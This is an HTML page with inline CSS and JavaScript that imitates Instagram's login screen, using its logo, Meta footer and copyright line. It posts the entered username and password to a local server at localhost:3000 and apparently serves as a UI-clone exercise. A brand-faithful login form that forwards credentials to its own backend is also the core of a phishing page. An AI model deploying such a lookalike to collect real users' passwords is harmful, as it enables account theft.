<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }

        .container {
            display: flex;
            max-width: 935px;
            margin: 0 auto;
        }

        .phones {
            background-image: url('https://i.ibb.co/3Fp7f6z/instagram-phones.png');
            background-position: 0 0;
            background-size: 454px 618px;
            height: 618px;
            width: 454px;
            margin-right: 30px;
        }

        .login-box {
            width: 350px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin: 30px 0;
            padding: 20px 40px;
        }

        .logo {
            text-align: center;
            margin: 22px auto 12px;
        }

        .logo img {
            width: 175px;
        }

        .login-form {
            margin-top: 24px;
        }

        .input-field {
            margin-bottom: 6px;
            position: relative;
        }

        input {
            padding: 9px 8px;
            font-size: 12px;
            width: 100%;
            height: 36px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        .login-button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            width: 100%;
            padding: 7px;
            margin-top: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .login-button:disabled {
            background-color: #b2dffc;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .fb-login {
            color: #385185;
            text-align: center;
            margin: 8px 0;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        .fb-login i {
            font-size: 18px;
            margin-right: 6px;
        }

        .forgot-pw {
            color: #00376b;
            text-align: center;
            font-size: 12px;
            margin-top: 12px;
            cursor: pointer;
        }

        .signup-box {
            width: 350px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin: 10px 0;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
            width: 350px;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .app-download {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .app-download img {
            height: 40px;
        }

        footer {
            max-width: 935px;
            margin: 50px auto 0;
            padding: 0 20px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }

        .copyright {
            color: #8e8e8e;
            text-align: center;
            font-size: 12px;
            margin-bottom: 30px;
        }

        @media (max-width: 875px) {
            .phones {
                display: none;
            }
            
            .container {
                justify-content: center;
            }
        }

        @media (max-width: 450px) {
            .login-box, .signup-box, .get-app {
                width: 100%;
                border: none;
                background-color: transparent;
            }
        }
        
        /* Loading spinner */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Error message */
        .error-message {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- <div class="phones"></div> -->
        <div class="right-section">
            <div class="login-box">
                <div class="logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div>
                <form id="loginForm" class="login-form">
                    <div class="input-field">
                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
                    </div>
                    <div class="input-field">
                        <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                    </div>
                    <button type="submit" class="login-button" id="loginBtn" disabled>Log in</button>
                    <div class="error-message" id="errorMessage"></div>
                    
                    <div class="divider">
                        <div class="divider-line"></div>
                        <div class="divider-text">OR</div>
                        <div class="divider-line"></div>
                    </div>
                    
                    <div class="fb-login">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </div>
                    
                    <div class="forgot-pw">Forgot password?</div>
                </form>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            
            <!-- <div class="get-app">
                <p>Get the app.</p>
                <div class="app-download">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-KlZ.png" alt="App Store">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
                </div>
            </div> -->
        </div>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="copyright">
            <select>
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
            </select>
            <br><br>
            © 2023 Instagram from Meta
        </div>
    </footer>

    <script>
        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const usernameEl = document.getElementById('username');
        const passwordEl = document.getElementById('password');
        const errorMessage = document.getElementById('errorMessage');

        function validate() {
            const u = usernameEl.value.trim();
            const p = passwordEl.value.trim();
            loginBtn.disabled = !(u.length > 0 && p.length >= 6);
        }
        usernameEl.addEventListener('input', validate);
        passwordEl.addEventListener('input', validate);

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = usernameEl.value.trim();
            const password = passwordEl.value;

            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
            errorMessage.style.display = 'none';

            try {
                const res = await fetch('http://localhost:3000/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await res.json();
                
                if (res.ok) {
                    // Login successful
                    alert('Login successful! Redirecting...');
                    // In a real app, you would redirect or store the auth token
                } else {
                    // Login failed
                    errorMessage.textContent = data.message || 'Login failed. Please try again.';
                    errorMessage.style.display = 'block';
                }
            } catch (err) {
                errorMessage.textContent = 'Network error. Please check your connection.';
                errorMessage.style.display = 'block';
            } finally {
                loginBtn.innerHTML = 'Log in';
                validate();
            }
        });
    </script>
</body>
</html>
